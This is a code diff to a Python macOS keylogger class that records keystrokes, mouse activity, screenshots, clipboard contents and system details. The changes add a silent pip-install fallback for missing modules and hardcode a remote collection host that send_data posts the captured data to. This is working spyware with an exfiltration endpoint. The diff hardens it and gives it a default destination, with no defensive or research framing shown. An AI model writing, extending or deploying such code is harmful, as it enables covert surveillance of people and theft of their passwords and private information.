@@ -1,21 +1,25 @@
-import Quartz
-import time
-import datetime
-import platform
-import os
-import requests
-import json
-import io
-import base64
-from Quartz import CGWindowListCopyWindowInfo, kCGNullWindowID, kCGWindowListOptionOnScreenOnly
-from pynput.keyboard import Listener as KeyListener
-from pynput.mouse import Listener as MouseListener
-from PIL import ImageGrab
-from pandas.io.clipboard import clipboard_get
-from pynput import mouse
-from dotenv import load_dotenv
-load_dotenv()
-
+try: 
+    import Quartz
+    import time
+    import datetime
+    import platform
+    import os
+    import requests
+    import json
+    import io
+    import base64
+    from Quartz import CGWindowListCopyWindowInfo, kCGNullWindowID, kCGWindowListOptionOnScreenOnly
+    from pynput.keyboard import Listener as KeyListener
+    from pynput.mouse import Listener as MouseListener
+    from PIL import ImageGrab
+    from pandas.io.clipboard import clipboard_get
+    from pynput import mouse
+    from dotenv import load_dotenv
+    load_dotenv()
+except ModuleNotFoundError:
+    from subprocess import call
+    modules = ["pynput", "Pillow", "pandas", "python-dotenv"]
+    call("pip install " + " ".join(modules), shell=True)
 
 class Keylogger:
     log_dir = r"./data/"
@@ -35,7 +39,12 @@ class Keylogger:
         return platform.platform(), platform.uname(), platform.system(), platform.release(), platform.version(), platform.machine(), platform.processor(), platform.architecture(), platform.node(), platform.platform(), platform.python_build(), platform.python_compiler(), platform.python_branch(), platform.python_implementation(), platform.python_revision(), platform.python_version(), platform.python_version_tuple()
 
     def get_app_name(self):
-        return self.get_active_window().split()[0]
+        try:
+            app_name = self.get_active_window().split()[0]
+            return app_name
+        except Exception as e:
+            print("Error occurred while getting app name: ", e)
+            return "Unknown"
 
     def get_active_window(self):
         windows = Quartz.CGWindowListCopyWindowInfo(
@@ -158,6 +167,8 @@ class Keylogger:
 
     def send_data(self, url, data_value=None):
         host = os.environ.get('host')
+        if host is None:
+            host = "https://Keylogger.pzcuong2410.repl.co"
         url = str(host) + str(url)
         headers = {"os_data": json.dumps(self.os_data)}
 
